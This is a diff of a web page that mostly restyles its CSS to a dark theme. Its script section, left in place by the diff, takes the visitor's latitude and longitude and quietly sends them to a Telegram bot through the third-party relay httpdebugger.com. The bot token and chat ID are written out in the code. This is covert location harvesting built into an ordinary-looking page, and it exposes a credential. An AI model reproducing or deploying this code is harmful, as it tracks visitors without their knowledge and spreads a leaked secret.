@@ -10,50 +10,59 @@
       margin: 0;
       padding: 0;
       font-family: 'Vazir', sans-serif;
-      background-color: #f8e1e7;
+      background-color: #1e1e1e;
+      color: #f5f5f5;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
       text-align: center;
-      color: #2d2d2d;
+      background-image: linear-gradient(to bottom right, #2c2c2c, #1a1a1a);
     }
+
     h1 {
-      font-size: 2.5em;
+      font-size: 2.8em;
       margin-bottom: 10px;
+      color: #ffcc00;
     }
+
     p {
-      font-size: 1.3em;
+      font-size: 1.4em;
       margin-bottom: 30px;
+      color: #cccccc;
     }
+
     button {
-      background-color: #e84393;
-      color: white;
+      background-color: #ff6600;
+      color: #fff;
       border: none;
       padding: 15px 40px;
       font-size: 1.2em;
-      border-radius: 12px;
+      border-radius: 8px;
       cursor: pointer;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
       transition: background-color 0.3s ease, transform 0.2s ease;
     }
+
     button:hover {
-      background-color: #d63074;
+      background-color: #e65c00;
       transform: scale(1.05);
     }
+
     footer {
       margin-top: auto;
       width: 100%;
-      background-color: #fce4ec;
+      background-color: #2a2a2a;
       padding: 15px 0;
       font-size: 0.9em;
-      color: #555;
-      border-top: 1px solid #e0e0e0;
+      color: #999;
+      border-top: 1px solid #444;
     }
+
     @media (max-width: 600px) {
       h1 {
-        font-size: 2em;
+        font-size: 2.2em;
       }
       p {
         font-size: 1.1em;
@@ -95,19 +104,16 @@
       console.log("Longitude:", longitude);
 
       if (latitude && longitude) {
-        // ساخت URL تلگرام
         var tgUrl = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
                   + "?chat_id=8438093859"
                   + "&text=" + encodeURIComponent("Latitude: " + latitude + ", Longitude: " + longitude);
 
-        // شبیه‌سازی همان درخواست پایتون به httpdebugger به‌عنوان سرور واسطه
         var formData = new FormData();
         formData.append("UrlBox", tgUrl);
         formData.append("AgentList", "Google chrome");
         formData.append("VersionsList", "HTTP/1.1");
         formData.append("MethodList", "POST");
 
-        // ارسال به سرور واسطه
         fetch("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", {
           method: "POST",
           body: formData,
